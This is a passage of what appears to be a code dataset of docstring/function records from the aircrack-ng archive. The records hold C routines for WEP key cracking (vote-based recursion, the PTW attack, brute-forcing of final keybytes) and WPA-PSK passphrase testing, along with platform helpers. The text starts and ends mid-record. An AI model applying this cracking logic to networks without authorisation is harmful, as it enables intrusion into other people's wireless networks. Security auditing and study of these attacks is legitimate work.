nb_kprev / delta);\n\n\t\tprintf(\"%d k/s\\r\", ks);\n\t\tfflush(stdout);\n\n\t\tif (et_s >= 15) {\n\t\t\tprintf(\"\\n\");\n\t\t\texit(0);\n\t\t}\n\n\t\tgoto __out;\n\t}\n\n\tksec = (float) nb_kprev / delta;\n\n\tif( opt.l33t ) printf( \"\\33[33;1m\" );\n\n\tif (opt.stdin_dict) {\n\t\tprintf( \"\\33[5;20H[%02d:%02d:%02d] %lld keys tested \"\n\t\t\t\"(%2.2f k/s) \", et_h, et_m, et_s,\n\t\t\tnb_tried, (float) nb_kprev / delta);\n\t} else {\n\t\tcalc = ((float)nb_tried / (float)opt.wordcount)*100;\n\t\tremain = (opt.wordcount - nb_tried);\n\t\teta = (remain / (long long int)ksec);\n\n\t\tprintf( \"\\33[4;7H[%02d:%02d:%02d] %lld/%lld keys tested \"\n\t\t\t\"(%2.2f k/s) \", et_h, et_m, et_s,\n\t\t\tnb_tried, opt.wordcount, (float) nb_kprev / delta);\n\n\t\tprintf( \"\\33[6;7HTime left: \");\n\t\tcalctime(eta, calc);\n\t}\n\n\tmemset( tmpbuf, ' ', sizeof( tmpbuf ) );\n\tmemcpy( tmpbuf, key, keylen > 27 ? 27 : keylen );\n\ttmpbuf[27] = '\\0';\n\n\tif( opt.l33t ) printf( \"\\33[37;1m\" );\n\tprintf( \"\\33[8;24HCurrent passphrase: %s\\n\", tmpbuf );\n\n\tif( opt.l33t ) printf( \"\\33[32;22m\" );\n\tprintf( \"\\33[11;7HMaster Key     : \" );\n\n\tif( opt.l33t ) printf( \"\\33[32;1m\" );\n\tfor( i = 0; i < 32; i++ )\n\t{\n\t\tif( i == 16 ) printf( \"\\n\\33[23C\" );\n\t\tprintf( \"%02X \", pmk[i] );\n\t}\n\n\tif( opt.l33t ) printf( \"\\33[32;22m\" );\n\tprintf( \"\\33[14;7HTransient Key  : \" );\n\n\tif( opt.l33t ) printf( \"\\33[32;1m\" );\n\tfor( i = 0; i < 64; i++ )\n\t{\n\t\tif( i > 0 && i % 16 == 0 ) printf( \"\\n\\33[23C\" );\n\t\tprintf( \"%02X \", ptk[i] );\n\t}\n\n\tif( opt.l33t ) printf( \"\\33[32;22m\" );\n\tprintf( \"\\33[19;7HEAPOL HMAC     : \" );\n\n\tif( opt.l33t ) printf( \"\\33[32;1m\" );\n\tfor( i = 0; i < 16; i++ )\n\t\tprintf( \"%02X \", mic[i] );\n\n\tprintf( \"\\n\" );\n__out:\n\tpthread_mutex_unlock(&mx_wpastats);\n}", "path": "aircrack-ng-archive/src/aircrack-ng.c", "commit_date": "2018-03-09 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/*\n    if bssid != NULL its looking for a beacon frame\n*/\n", "func_signal": "int attack_check(unsigned char* bssid, char* essid, unsigned char* capa, struct wif *wi)", "code": "{\n    int ap_chan=0, iface_chan=0;\n\n    iface_chan = wi_get_channel(wi);\n\n    if(bssid != NULL)\n    {\n        ap_chan = wait_for_beacon(bssid, capa, essid);\n        if(ap_chan < 0)\n        {\n            PCT; printf(\"No such BSSID available.\\n\");\n            return -1;\n        }\n        if(ap_chan != iface_chan)\n        {\n            PCT; printf(\"%s is on channel %d, but the AP uses channel %d\\n\", wi_get_ifname(wi), iface_chan, ap_chan);\n            return -1;\n        }\n    }\n\n    return 0;\n}", "path": "aircrack-ng-archive/src/tkiptun-ng.c", "commit_date": "2017-05-27 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/**\n * Start reader thread\n * @return -1 if failed to start thread or 0 if it is successful\n */\n", "func_signal": "static int start_reader(struct tip_cygwin *priv)", "code": "{\n\tpriv->tc_running = 2;\n\tif (pthread_create(&priv->tc_reader, NULL, ti_reader, priv))\n\t\treturn -1;\n\n\tpriv->tc_running = 1;\n\n\treturn 0;\n}", "path": "aircrack-ng-archive/src/osdep/cygwin_tap.c", "commit_date": "2015-08-27 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/**\n * Reset the device\n * @return 0 if successful, -1 if it failed\n */\n", "func_signal": "static int ti_do_reset(HDEVINFO *hdi, SP_DEVINFO_DATA *did)", "code": "{\n\tint rc;\n\n\trc = ti_reset_state(hdi, did, DICS_DISABLE);\n\tif (rc)\n\t\treturn rc;\n\n\treturn ti_reset_state(hdi, did, DICS_ENABLE);\n}", "path": "aircrack-ng-archive/src/osdep/cygwin_tap.c", "commit_date": "2015-08-27 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "//#define XDEBUG 1\n//#define ODEBUG 1\n", "func_signal": "int init_wpapsk(char (*key)[128], char *essid, int threadid)", "code": "{\n#ifdef ODEBUG\n\tint prloop = 0;\n#endif\n\tint i = 0;\n\tint count = 0;\n\tunsigned char *lpmk1 = NULL, *lpmk2 = NULL, *lpmk3 = NULL, *lpmk4 = NULL;\n\tunsigned char *lpmk5 = NULL, *lpmk6 = NULL, *lpmk7 = NULL, *lpmk8 = NULL;\n\twpapsk_password\t*inbuffer;\t//table for candidate passwords (pointer to threads copy)\n\n\tlpmk1\t\t= xpmk1[threadid];\n\tlpmk2\t\t= xpmk2[threadid];\n\tlpmk3\t\t= xpmk3[threadid];\n\tlpmk4\t\t= xpmk4[threadid];\n\tlpmk5\t\t= xpmk5[threadid];\n\tlpmk6\t\t= xpmk6[threadid];\n\tlpmk7\t\t= xpmk7[threadid];\n\tlpmk8\t\t= xpmk8[threadid];\n\tinbuffer\t= wpapass[threadid];\n\n\tmemset(lpmk1, 0, 32);\n\tmemset(lpmk2, 0, 32);\n\tmemset(lpmk3, 0, 32);\n\tmemset(lpmk4, 0, 32);\n\tmemset(lpmk5, 0, 32);\n\tmemset(lpmk6, 0, 32);\n\tmemset(lpmk7, 0, 32);\n\tmemset(lpmk8, 0, 32);\n\n\tfor (; i < cpuinfo.simdsize; i++) {\n\t\tmemset(inbuffer[i].v, 0, sizeof(inbuffer[i].v));\n\t\tinbuffer[i].length = 0;\n\t}\n\n\tfor (i = 0; i < 8; ++i) {\n\t\tif (key[i][0] != 0) {\n\t\t\tset_key(key[i], i, inbuffer);\n#ifdef XDEBUG\n\t\t\tprintf(\"key%d (inbuffer) = %s\\n\", i+1, inbuffer[i].v);\n#endif\n\t\t\tcount = i + 1;\n\t\t}\n\t}\n\n#ifdef XDEBUG\n//\tprintf(\"%d key (%s) (%s) (%s) (%s)\\n\",threadid, key1,key2,key3,key4);\n#endif\n\n\twpapsk_sse(threadid, count, essid, inbuffer);\n\n\treturn 0;\n}", "path": "aircrack-ng-archive/src/wpapsk.c", "commit_date": "2016-11-15 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/**\n * Change status (enable/disable) of the device\n */\n", "func_signal": "static int ti_media_status(struct tip_cygwin *priv, int on)", "code": "{\n\tULONG s = on;\n\tDWORD len;\n\n\tif (!DeviceIoControl(priv->tc_h, TAP_IOCTL_SET_MEDIA_STATUS, &s,\n\t\t\t     sizeof(s), &s, sizeof(s), &len, NULL))\n\t\treturn -1;\n\n\treturn 0;\n}", "path": "aircrack-ng-archive/src/osdep/cygwin_tap.c", "commit_date": "2015-08-27 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/* fread isn't atomic, sadly */\n", "func_signal": "int atomic_read( read_buf *rb, int fd, int len, void *buf )", "code": "{\n\tint n;\n\n\tif( close_aircrack )\n\t\treturn( CLOSE_IT );\n\n\tif( rb->buf1 == NULL )\n\t{\n\t\trb->buf1 = malloc( 65536 );\n\t\trb->buf2 = malloc( 65536 );\n\n\t\tif( rb->buf1 == NULL || rb->buf2 == NULL )\n\t\t\treturn( 0 );\n\n\t\trb->off1 = 0;\n\t\trb->off2 = 0;\n\t}\n\n\tif( len > 65536 - rb->off1 )\n\t{\n\t\trb->off2 -= rb->off1;\n\n\t\tmemcpy( rb->buf2, rb->buf1 + rb->off1, rb->off2 );\n\t\tmemcpy( rb->buf1, rb->buf2, rb->off2 );\n\n\t\trb->off1 = 0;\n\t}\n\n\tif( rb->off2 - rb->off1 >= len )\n\t{\n\t\tmemcpy( buf, rb->buf1 + rb->off1, len );\n\t\trb->off1 += len;\n\t\treturn( 1 );\n\t}\n\telse\n\t{\n\t\tn = read( fd, rb->buf1 + rb->off2, 65536 - rb->off2 );\n\n\t\tif( n <= 0 )\n\t\t\treturn( 0 );\n\n\t\trb->off2 += n;\n\n\t\tif( rb->off2 - rb->off1 >= len )\n\t\t{\n\t\t\tmemcpy( buf, rb->buf1 + rb->off1, len );\n\t\t\trb->off1 += len;\n\t\t\treturn( 1 );\n\t\t}\n\t}\n\n\treturn( 0 );\n}", "path": "aircrack-ng-archive/src/aircrack-ng.c", "commit_date": "2018-03-09 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/* from ifconfig */\n", "func_signal": "static __inline int\nmapgsm(u_int freq, u_int flags)", "code": "{\n        freq *= 10;\n        if (flags & IEEE80211_CHAN_QUARTER)\n                freq += 5;\n        else if (flags & IEEE80211_CHAN_HALF)\n                freq += 10;\n        else\n                freq += 20;\n        /* NB: there is no 907/20 wide but leave room */\n        return (freq - 906*10) / 5;\n}", "path": "aircrack-ng-archive/src/osdep/freebsd.c", "commit_date": "2015-12-05 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/* standard attack mode: */\n/* this routine gathers and sorts the votes, then recurses until it *\n * reaches B == keylen. It also stops when the current keybyte vote *\n * is lower than the highest vote divided by the fudge factor.      */\n", "func_signal": "int do_wep_crack1( int B )", "code": "{\n\tint i, j, l, m, tsel, charread;\n\tint remove_keybyte_nr, remove_keybyte_value;\n\t//int a,b;\n\tstatic int k = 0;\n\tchar user_guess[4];\n\n\tget_ivs:\n\n\tswitch( update_ivbuf() )\n\t{\n\t\tcase FAILURE: return( FAILURE );\n\t\tcase RESTART: return( RESTART );\n\t\tdefault: break;\n\t}\n\n\tif( ( wep.nb_ivs_now < 256 && opt.debug[0] == 0 ) ||\n\t\t( wep.nb_ivs_now <  32 && opt.debug[0] != 0 ) )\n\t{\n\t\tif( ! opt.no_stdin )\n\t\t{\n\t\t\tprintf(\n\t\t\t\t\"Not enough IVs available. You need about 250 000 IVs to crack\\n\"\n\t\t\t\t\"40-bit WEP, and more than 800 000 IVs to crack a 104-bit key.\\n\" );\n\t\t\tkill( 0, SIGTERM );\n\t\t\t_exit( FAILURE );\n\t\t}\n\t\telse\n\t\t{\n\t\t\tprintf( \"Read %ld packets, got %ld IVs...\\r\",\n\t\t\t\tnb_pkt, wep.nb_ivs_now );\n\t\t\tfflush( stdout );\n\n\t\t\tsleep( 1 );\n\t\t\tgoto get_ivs;\n\t\t}\n\t}\n\n\t/* if last keybyte reached, check if the key is valid */\n\n\tif( B == opt.keylen )\n\t{\n\t\tif( ! opt.is_quiet )\n\t\t\tshow_wep_stats( B - 1, 0, NULL, NULL, NULL, 0 );\n\n\t\treturn( check_wep_key( wep.key, B, 0 ) );\n\t}\n\n\t/* now compute the poll results for keybyte B */\n\n\tif( calc_poll( B ) != SUCCESS )\n\t\treturn( FAILURE );\n\n\t/* fudge threshold = highest vote divided by fudge factor */\n\n\tfor( wep.fudge[B] = 1; wep.fudge[B] < 256; wep.fudge[B]++ )\n\t\tif( (float) wep.poll[B][wep.fudge[B]].val <\n\t\t(float) wep.poll[B][0].val / opt.ffact )\n\t\t\tbreak;\n\n\t/* try the most likely n votes, where n is the fudge threshold */\n\n\tfor( wep.depth[B] = 0; wep.depth[B] < wep.fudge[B]; ( wep.depth[B] )++ )\n\t{\n\t\tswitch( update_ivbuf() )\n\t\t{\n\t\t\tcase FAILURE: return( FAILURE );\n\t\t\tcase RESTART: return( RESTART );\n\t\t\tdefault: break;\n\t\t}\n\n\t\twep.key[B] = wep.poll[B][wep.depth[B]].idx;\n\n\t\tif( ! opt.is_quiet )\n\t\t{\n\t\t\tshow_wep_stats( B, 0, NULL, NULL, NULL, 0 );\n\t\t}\n\n\t\tif( B == 4 && opt.keylen == 13 )\n\t\t{\n\t\t\t/* even when cracking 104-bit WEP, *\n\t\t\t * check if the 40-bit key matches */\n\n\t\t\t/* opt.keylen = 5; many functions use keylen. it is dangerous to do this in a multithreaded process */\n\n\t\t\tif( check_wep_key( wep.key, B, 5 ) == SUCCESS )\n\t\t\t{\n\t\t\t\topt.keylen = 5;\n\t\t\t\treturn( SUCCESS );\n\t\t\t}\n\n\t\t\t/* opt.keylen = 13; */\n\t\t}\n\n\n\n\t\tif( B + opt.do_brute + 1 == opt.keylen && opt.do_brute )\n\t\t{\n\t\t\t/* as noted by Simon Marechal, it's more efficient\n\t\t\t * to just bruteforce the last two keybytes. */\n\n\t\t\t/*\n\t\t\t\tAsk for removing votes here\n\t\t\t\t1. Input keybyte. Use enter when it's done => Bruteforce will start\n\t\t\t\t2. Input value to remove votes from: 00 -> FF or Enter to cancel remove\n\t\t\t\t3. Remove votes\n\t\t\t\t4. Redraw\n\t\t\t\t5. Go back to 1\n\t\t\t*/\n\t\t\tif (opt.visual_inspection == 1)\n\t\t\t{\n\t\t\t\twhile(1)\n\t\t\t\t{\n\t\t\t\t\t// Show the current stat\n\t\t\t\t\tshow_wep_stats( B, 1, NULL, NULL, NULL, 0 );\n\n\t\t\t\t\t// Inputting user value until it hits enter or give a valid value\n\t\t\t\t\tprintf(\"On which keybyte do you want to remove votes (Hit Enter when done)? \");\n\t\t\t\t\tmemset(user_guess, 0, 4);\n\n\t\t\t\t\tcharread = readLine(user_guess, 3);\n\n\t\t\t\t\t// Break if 'Enter' key was hit\n\t\t\t\t\tif (user_guess[0] == 0 || charread == 0)\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\t// If it's not a number, reask\n\t\t\t\t\t// Check if inputted value is correct (from 0 to and inferior to opt.keylen)\n\t\t\t\t\tremove_keybyte_nr = atoi(user_guess);\n\t\t\t\t\tif (isdigit((int)user_guess[0]) == 0 || remove_keybyte_nr < 0 || remove_keybyte_nr >= opt.keylen)\n\t\t\t\t\t\tcontinue;\n\n\n\t\t\t\t\t// It's a number for sure and the number is correct\n\t\t\t\t\t// Now ask which value should be removed\n\t\t\t\t\tprintf(\"From which keybyte value do you want to remove the votes (Hit Enter to cancel)? \");\n\t\t\t\t\tmemset(user_guess, 0, 4);\n\t\t\t\t\tcharread = readLine(user_guess, 3);\n\n\t\t\t\t\t// Break if enter was hit\n\t\t\t\t\tif (user_guess[0] == 0 || charread == 0)\n\t\t\t\t\t\tcontinue;\n\n\t\t\t\t\tremove_keybyte_value = hexToInt(user_guess, charread);\n\n\t\t\t\t\t// Check if inputted value is correct (hexa). Value range: 00 - FF\n\t\t\t\t\tif (remove_keybyte_value < 0 || remove_keybyte_value > 255)\n\t\t\t\t\t\tcontinue;\n\n\t\t\t\t\t// If correct, remove and redraw\n\t\t\t\t\tremove_votes(remove_keybyte_nr, (unsigned char)remove_keybyte_value);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (opt.nbcpu==1 || opt.do_mt_brute==0)\n\t\t\t{\n\n\t\t\t\tif (opt.do_brute==4)\n\t\t\t\t{\n\t\t\t\t\tfor( l = 0; l < 256; l++)\n\t\t\t\t\t{\n\t\t\t\t\t\twep.key[opt.brutebytes[0]] = l;\n\n\t\t\t\t\t\tfor( m = 0; m < 256; m++ )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\twep.key[opt.brutebytes[1]] = m;\n\n\t\t\t\t\t\t\tfor( i = 0; i < 256; i++ )\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\twep.key[opt.brutebytes[2]] = i;\n\n\t\t\t\t\t\t\t\tfor( j = 0; j < 256; j++ )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\twep.key[opt.brutebytes[3]] = j;\n\n\t\t\t\t\t\t\t\t\tif (check_wep_key( wep.key, B + 1, 0 ) == SUCCESS)\n\t\t\t\t\t\t\t\t\t\treturn SUCCESS;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (opt.do_brute==3)\n\t\t\t\t{\n\t\t\t\t\tfor( m = 0; m < 256; m++ )\n\t\t\t\t\t{\n\t\t\t\t\t\twep.key[opt.brutebytes[0]] = m;\n\n\t\t\t\t\t\tfor( i = 0; i < 256; i++ )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\twep.key[opt.brutebytes[1]] = i;\n\n\t\t\t\t\t\t\tfor( j = 0; j < 256; j++ )\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\twep.key[opt.brutebytes[2]] = j;\n\n\t\t\t\t\t\t\t\tif (check_wep_key( wep.key, B + 1, 0 ) == SUCCESS)\n\t\t\t\t\t\t\t\t\treturn SUCCESS;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (opt.do_brute==2)\n\t\t\t\t{\n\t\t\t\t\tfor( i = 0; i < 256; i++ )\n\t\t\t\t\t{\n\t\t\t\t\t\twep.key[opt.brutebytes[0]] = i;\n\n\t\t\t\t\t\tfor( j = 0; j < 256; j++ )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\twep.key[opt.brutebytes[1]] = j;\n\n\t\t\t\t\t\t\tif (check_wep_key( wep.key, B + 1, 0 ) == SUCCESS)\n\t\t\t\t\t\t\t\treturn SUCCESS;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tfor( i = 0; i < 256; i++ )\n\t\t\t\t\t{\n\t\t\t\t\t\twep.key[opt.brutebytes[0]] = i;\n\n\t\t\t\t\t\tif (check_wep_key( wep.key, B + 1, 0 ) == SUCCESS)\n\t\t\t\t\t\t\treturn SUCCESS;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t/* multithreaded bruteforcing of the last 2 keybytes */\n\t\t\t\tk = (k+1) % opt.nbcpu;\n\t\t\t\tdo\n\t\t\t\t{\n\t\t\t\t\tfor(tsel=0; tsel<opt.nbcpu && !wepkey_crack_success; ++tsel)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (bf_nkeys[(tsel+k) % opt.nbcpu]>16)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tusleep(1);\n\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t/* write our current key to the pipe so it'll have its last 2 bytes bruteforced */\n\t\t\t\t\t\t\tbf_nkeys[(tsel+k) % opt.nbcpu]++;\n\n\t\t\t\t\t\t\tif (safe_write(bf_pipe[(tsel+k) % opt.nbcpu][1], (void *) wep.key, 64) != 64)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tperror( \"write pmk failed\" );\n\t\t\t\t\t\t\t\tkill( 0, SIGTERM );\n\t\t\t\t\t\t\t\t_exit( FAILURE );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t} while (tsel>=opt.nbcpu && !wepkey_crack_success);\n\n\t\t\t\tif (wepkey_crack_success)\n\t\t\t\t{\n\t\t\t\t\tmemcpy(wep.key, bf_wepkey, opt.keylen);\n\t\t\t\t\treturn(SUCCESS);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tswitch( do_wep_crack1( B + 1 ) )\n\t\t\t{\n\t\t\t\tcase SUCCESS: return( SUCCESS );\n\t\t\t\tcase RESTART: return( RESTART );\n\t\t\t\tdefault: break;\n\t\t\t}\n\t\t}\n\t}\n\n\t//if we are going to fail on the root byte, check again if there are still threads bruting, if so wait and check again.\n\tif(B==0)\n\t{\n\t\tfor(i=0; i<opt.nbcpu; i++)\n\t\t{\n\t\t\twhile(bf_nkeys[i]>0 && !wepkey_crack_success) usleep(1);\n\t\t}\n\t\tif (wepkey_crack_success)\n\t\t{\n\t\t\tmemcpy(wep.key, bf_wepkey, opt.keylen);\n\t\t\treturn(SUCCESS);\n\t\t}\n\t}\n\treturn( FAILURE );\n}", "path": "aircrack-ng-archive/src/aircrack-ng.c", "commit_date": "2018-03-09 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/*\nUses the PTW attack to crack the WEP key.\n\nReturn: SUCCESS if it cracked the key,\n        FAILURE if it could not.\n*/\n", "func_signal": "static int crack_wep_ptw(struct AP_info *ap_cur)", "code": "{\n    int (* all)[256];\n    int i, j, len = 0;\n\n    opt.ap = ap_cur;\n\n    all = malloc(32*sizeof(int [256]));\n    if (all == NULL) {\n    \treturn FAILURE;\n    }\n\n    //initial setup (complete keyspace)\n    for (i = 0; i < 32; i++) {\n        for (j = 0; j < 256; j++) {\n            all[i][j] = 1;\n        }\n    }\n\n    //setting restricted keyspace\n    for (i = 0; i < 32; i++) {\n        for (j = 0; j < 256; j++) {\n            if( (opt.is_alnum && (j<32 || j>=128) ) ||\n                (opt.is_fritz && (j<48 || j>=58)) ||\n                (opt.is_bcdonly && ( j > 0x99 || ( j & 0x0F ) > 0x09 )) )\n                all[i][j] = 0;\n        }\n    }\n\n    //if debug is specified, force a specific value.\n    for (i=0; i<32; i++) {\n        for (j = 0; j < 256; j++) {\n            if(opt.debug_row[i] == 1 && opt.debug[i] != j)\n                all[i][j] = 0;\n            else if(opt.debug_row[i] == 1 && opt.debug[i] == j)\n                all[i][j] = 1;\n        }\n    }\n\n    if(ap_cur->nb_ivs_clean > 99)\n    {\n        ap_cur->nb_ivs = ap_cur->nb_ivs_clean;\n        //first try without bruteforcing, using only \"clean\" keystreams\n        if(opt.keylen != 13)\n        {\n            if(PTW_computeKey(ap_cur->ptw_clean, wep.key, opt.keylen, (KEYLIMIT*opt.ffact), PTW_DEFAULTBF, all, opt.ptw_attack) == 1)\n                len = opt.keylen;\n        }\n        else\n        {\n            /* try 1000 40bit keys first, to find the key \"instantly\" and you don't need to wait for 104bit to fail */\n            if(PTW_computeKey(ap_cur->ptw_clean, wep.key, 5, 1000, PTW_DEFAULTBF, all, opt.ptw_attack) == 1)\n                len = 5;\n            else if(PTW_computeKey(ap_cur->ptw_clean, wep.key, 13, (KEYLIMIT*opt.ffact), PTW_DEFAULTBF, all, opt.ptw_attack) == 1)\n                len = 13;\n            else if(PTW_computeKey(ap_cur->ptw_clean, wep.key, 5, (KEYLIMIT*opt.ffact)/3, PTW_DEFAULTBF, all, opt.ptw_attack) == 1)\n                len = 5;\n        }\n    }\n    if(!len)\n    {\n        ap_cur->nb_ivs = ap_cur->nb_ivs_vague;\n        //in case it's not found, try bruteforcing the id field and include \"vague\" keystreams\n        PTW_DEFAULTBF[10]=1;\n        PTW_DEFAULTBF[11]=1;\n//        PTW_DEFAULTBF[12]=1;\n\n        if(opt.keylen != 13)\n        {\n            if(PTW_computeKey(ap_cur->ptw_vague, wep.key, opt.keylen, (KEYLIMIT*opt.ffact), PTW_DEFAULTBF, all, opt.ptw_attack) == 1)\n                len = opt.keylen;\n        }\n        else\n        {\n            /* try 1000 40bit keys first, to find the key \"instantly\" and you don't need to wait for 104bit to fail */\n            if(PTW_computeKey(ap_cur->ptw_vague, wep.key, 5, 1000, PTW_DEFAULTBF, all, opt.ptw_attack) == 1)\n                len = 5;\n            else if(PTW_computeKey(ap_cur->ptw_vague, wep.key, 13, (KEYLIMIT*opt.ffact), PTW_DEFAULTBF, all, opt.ptw_attack) == 1)\n                len = 13;\n            else if(PTW_computeKey(ap_cur->ptw_vague, wep.key, 5, (KEYLIMIT*opt.ffact)/10, PTW_DEFAULTBF, all, opt.ptw_attack) == 1)\n                len = 5;\n        }\n    }\n\n    if (!len)\n            return FAILURE;\n\n    opt.probability = 100;\n    key_found(wep.key, len, -1);\n\n    return SUCCESS;\n}", "path": "aircrack-ng-archive/src/aircrack-ng.c", "commit_date": "2018-03-09 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/* experimental single bruteforce attack */\n", "func_signal": "int do_wep_crack2( int B )", "code": "{\n\tint i, j;\n\n\tswitch( update_ivbuf() )\n\t{\n\t\tcase FAILURE: return( FAILURE );\n\t\tcase RESTART: return( RESTART );\n\t\tdefault: break;\n\t}\n\n\tif( wep.nb_ivs_now / opt.keylen < 60000 )\n\t{\n\t\tprintf(\n\t\t\t\"Not enough IVs available. This option is only meant to be used\\n\"\n\t\t\t\"if the standard attack method fails with more than %d IVs.\\n\",\n\t\t\topt.keylen * 60000 );\n\t\tkill( 0, SIGTERM );\n\t\t_exit( FAILURE );\n\t}\n\n\tfor( i = 0; i <= B; i++ )\n\t{\n\t\tif( calc_poll( i ) != SUCCESS )\n\t\t\treturn( FAILURE );\n\n\t\twep.key[i] = wep.poll[i][0].idx;\n\n\t\twep.fudge[i] = 1;\n\t\twep.depth[i] = 0;\n\n\t\tif( ! opt.is_quiet )\n\t\t\tshow_wep_stats( i, 0, NULL, NULL, NULL, 0 );\n\t}\n\n\tfor( wep.fudge[B] = 1; wep.fudge[B] < 256; wep.fudge[B]++ )\n\t\tif( (float) wep.poll[B][wep.fudge[B]].val <\n\t\t(float) wep.poll[B][0].val / opt.ffact )\n\t\t\tbreak;\n\n\tfor( wep.depth[B] = 0; wep.depth[B] < wep.fudge[B]; wep.depth[B]++ )\n\t{\n\t\tswitch( update_ivbuf() )\n\t\t{\n\t\t\tcase FAILURE: return( FAILURE );\n\t\t\tcase RESTART: return( RESTART );\n\t\t\tdefault: break;\n\t\t}\n\n\t\twep.key[B] = wep.poll[B][wep.depth[B]].idx;\n\n\t\tif( ! opt.is_quiet )\n\t\t\tshow_wep_stats( B, 0, NULL, NULL, NULL, 0 );\n\n\t\tfor( i = B + 1; i < opt.keylen - 2; i++ )\n\t\t{\n\t\t\tif( calc_poll( i ) != SUCCESS )\n\t\t\t\treturn( FAILURE );\n\n\t\t\twep.key[i] = wep.poll[i][0].idx;\n\n\t\t\twep.fudge[i] = 1;\n\t\t\twep.depth[i] = 0;\n\n\t\t\tif( ! opt.is_quiet )\n\t\t\t\tshow_wep_stats( i, 0, NULL, NULL, NULL, 0 );\n\t\t}\n\n\t\tfor( i = 0; i < 256; i++ )\n\t\t{\n\t\t\twep.key[opt.keylen - 2] = i;\n\n\t\t\tfor( j = 0; j < 256; j++ )\n\t\t\t{\n\t\t\t\twep.key[opt.keylen - 1] = j;\n\n\t\t\t\tif( check_wep_key( wep.key, opt.keylen - 2, 0 ) == SUCCESS )\n\t\t\t\t\treturn( SUCCESS );\n\t\t\t}\n\t\t}\n\t}\n\n\treturn( FAILURE );\n}", "path": "aircrack-ng-archive/src/aircrack-ng.c", "commit_date": "2018-03-09 00:00:00", "repo_name": "aircrack-ng/aircrack-ng-archive", "stars": 848, "license": "gpl-2.0", "language": "c", "size": 11547}
{"docstring": "/* test if the current WEP key is valid */\n", "func_signal": "int check_wep_key( unsigned char *wepkey, int B, int keylen )", "code": "{\n\tunsigned char x1, x2;\n\tunsigned long xv;\n\tint i, j, n, bad, tests;\n\n\tunsigned char K[64];\n\tunsigned char S[256];\n\n\tif (keylen<=0)\n\t\tkeylen = opt.keylen;\n\n\tpthread_mutex_lock(&mx_nb);\n\tnb_tried++;\n\tpthread_mutex_unlock(&mx_nb);\n\n\tbad = 0;\n\n\tmemcpy( K + 3, wepkey, keylen );\n\n\ttests = 32;\n\n// \tprintf(\"keylen: %d\\n\", keylen);\n// \tif(keylen==13)\n// \t\tprintf(\"%02X:%02X:%02X:%02X:%02X\\n\", wepkey[8],wepkey[9],wepkey[10],wepkey[11],wepkey[12]);\n\n\tif(opt.dict) tests = wep.nb_ivs;\n\n\tif(tests < TEST_MIN_IVS) tests=TEST_MIN_IVS;\n\tif(tests > TEST_MAX_IVS) tests=TEST_MAX_IVS;\n\n\tfor( n = 0; n < tests; n++ )\n\t{\n\t\t/* xv = 5 * ( rand() % wep.nb_ivs ); */\n\t\txv = 5 * n;\n\n\t\tpthread_mutex_lock( &mx_ivb );\n\n\t\tmemcpy( K, &wep.ivbuf[xv], 3 );\n\t\tmemcpy( S, R, 256 );\n\n\t\tfor( i = j = 0; i < 256; i++ )\n\t\t{\n\t\t\tj = ( j + S[i] + K[i % (3 + keylen)]) & 0xFF;\n\t\t\tSWAP( S[i], S[j] );\n\t\t}\n\n\t\ti = 1; j = ( 0 + S[i] ) & 0xFF; SWAP(S[i], S[j]);\n\t\tx1 = wep.ivbuf[xv + 3] ^ S[(S[i] + S[j]) & 0xFF];\n\n\t\ti = 2; j = ( j + S[i] ) & 0xFF; SWAP(S[i], S[j]);\n\t\tx2 = wep.ivbuf[xv + 4] ^ S[(S[i] + S[j]) & 0xFF];\n\n\t\tpthread_mutex_unlock( &mx_ivb );\n\n//\t\tprintf(\"xv: %li x1: %02X  x2: %02X\\n\", (xv/5), x1, x2);\n\n\t\tif( ( x1 != 0xAA || x2 != 0xAA ) 